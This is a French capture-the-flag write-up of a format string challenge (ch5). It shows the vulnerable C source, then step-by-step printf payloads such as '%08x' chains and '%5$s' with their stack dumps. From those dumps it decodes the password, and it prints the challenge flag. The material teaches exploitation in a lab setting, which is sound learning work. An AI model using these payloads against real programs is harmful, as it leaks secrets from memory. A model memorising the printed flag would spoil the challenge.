# Challenge Format String — Lecture de la stack (ch5)

## Code source

```c
int main(int argc, char *argv[]) {
    FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");  // ouvre le fichier passwd
    char buffer[32];                                                     // buffer de 32 bytes sur la stack
    fgets(buffer, sizeof(buffer), secret);                              // lit le passwd dans buffer
    printf(argv[1]);                                                     // ⚠️ VULNERABILITE
    fclose(secret);
    return 0;
}
```

**Points importants :**
- `fopen` ouvre le fichier et retourne un pointeur — pas encore le contenu
- `fgets` lit le contenu du fichier et le place dans `buffer` qui est **sur la stack**
- `printf(argv[1])` passe directement l'argument utilisateur comme format string → vulnérabilité format string
- Le mot de passe est en mémoire dans `buffer` **avant** que printf soit appelé

---

## La vulnérabilité — Format String

Normalement printf s'utilise comme ça :
```c
printf("%s", argv[1]);  // argv[1] est une simple DONNEE
```

Ici c'est :
```c
printf(argv[1]);  // argv[1] est traité comme une FORMAT STRING
```

Si tu passes `"%08x"` en argument, printf ne voit pas une string à afficher — il voit une **instruction** : *"va lire une valeur sur la stack et affiche-la en hexa"*. Il fait confiance aveuglément à la format string sans vérifier si des arguments ont vraiment été passés.

---

## Comprendre la stack

Quand le programme tourne, la stack ressemble à ça :

```
adresse haute
┌─────────────────┐
│ ...             │
├─────────────────┤
│ buffer[32]      │  ← LE MOT DE PASSE EST ICI, en dur, octets bruts
│                 │
├─────────────────┤
│ secret (FILE*)  │
├─────────────────┤
│ argc            │
├─────────────────┤
│ argv[0]         │  ← pointeur vers "./ch5"
├─────────────────┤
│ argv[1]         │  ← pointeur vers ta format string
├─────────────────┤
│ ...             │
└─────────────────┘
adresse basse
```

**Point crucial :** `buffer[32]` n'est pas un pointeur vers le mot de passe — c'est le mot de passe lui-même, posé directement en octets bruts sur la stack. C'est pour ça que `%s` ne peut pas le lire directement (il aurait besoin d'un pointeur qui pointe vers buffer).

---

## Les format specifiers utilisés

| Specifier | Ce que ça fait |
|-----------|----------------|
| `%08x` | lit 4 octets sur la stack, affiche en hexa sur 8 caractères |
| `%s` | lit 4 octets sur la stack, les interprète comme une adresse, affiche la string à cette adresse |
| `%n$x` | accès direct au n-ième élément sur la stack sans tout dépiler |

---

## Déroulement de l'exploitation

### Étape 1 — Dump basique de la stack

```bash
./ch5 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```

Résultat :
```
00000020.0804b160.0804853d.00000009.bffffd53.b7e19679.bffffc34.b7fc1000
```

On lit 8 cases mémoires de 4 octets chacune. Les adresses en `bffff...` sont sur la stack, les `b7...` sont dans la libc.

### Étape 2 — Essai avec %s pour lire des strings

```bash
./ch5 "%08x.%08x.%08x.%08x.%s"
```

Résultat : `./ch5` → on a lu `argv[0]`, on est sur la bonne zone mais pas encore le passwd.

On a aussi eu des segfaults quand `%s` essayait de lire une adresse non mappée en mémoire → on est allé trop loin.

### Étape 3 — Accès direct avec $

```bash
./ch5 "%1\$s"
./ch5 "%2\$s"
...
./ch5 "%5\$s"  → affiche "./ch5"
```

Le `n$` permet d'accéder directement au **n-ième paramètre** sur la stack. Avantage : l'adresse ne bouge pas selon la longueur de la format string.

### Étape 4 — Grand dump hexa

```bash
./ch5 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```

Résultat :
```
00000020.0804b160.0804853d.00000009.bffffd2b.b7e19679.
bffffc04.b7fc1000.b7fc1000.0804b160.39617044.28293664.
6d617045.bf000a64.0804861b.00000002
```

### Étape 5 — Identifier les octets ASCII

On cherche des valeurs dont **tous les octets sont dans la plage ASCII** (`0x20` à `0x7e`) :

```
39617044  →  39=9  61=a  70=p  44=D  ✅ TEXTE
28293664  →  28=(  29=)  36=6  64=d  ✅ TEXTE
6d617045  →  6d=m  61=a  70=p  45=E  ✅ TEXTE
bf000a64  →  bf=?  0a=\n (fin de fgets)
```

### Étape 6 — Conversion little-endian

Sur x86 les données sont stockées en **little-endian** : l'octet le moins significatif est en premier en mémoire. Donc on lit les octets de droite à gauche par paires :

```
39617044  →  44 70 61 39  →  D  p  a  9
28293664  →  64 36 29 28  →  d  6  )  (
6d617045  →  45 70 61 6d  →  E  p  a  m
bf000a64  →  64 0a ...    →  d  \n (fin)
```

---

## Flag obtenu

```
Dpa9d6)(Epamd
```

---

## Résumé des concepts

| Concept | Détail |
|---|---|
| **Format String vulnerability** | `printf(argv[1])` au lieu de `printf("%s", argv[1])` → l'utilisateur contrôle la format string |
| **%08x** | Lit 4 octets bruts sur la stack et les affiche en hexa |
| **%s** | Interprète la valeur sur la stack comme un pointeur et lit la string à cette adresse |
| **%n$x** | Accès direct au n-ième élément de la stack |
| **buffer sur la stack** | `buffer[32]` n'est pas un pointeur, c'est directement les octets du passwd posés sur la stack |
| **Little-endian** | Les octets sont stockés dans l'ordre inverse → on lit de droite à gauche |
| **Plage ASCII** | Octets entre 0x20 et 0x7e → permet de repérer du texte dans un dump hexa |
| **0x0a** | `\n` ajouté par fgets → marque la fin du mot de passe |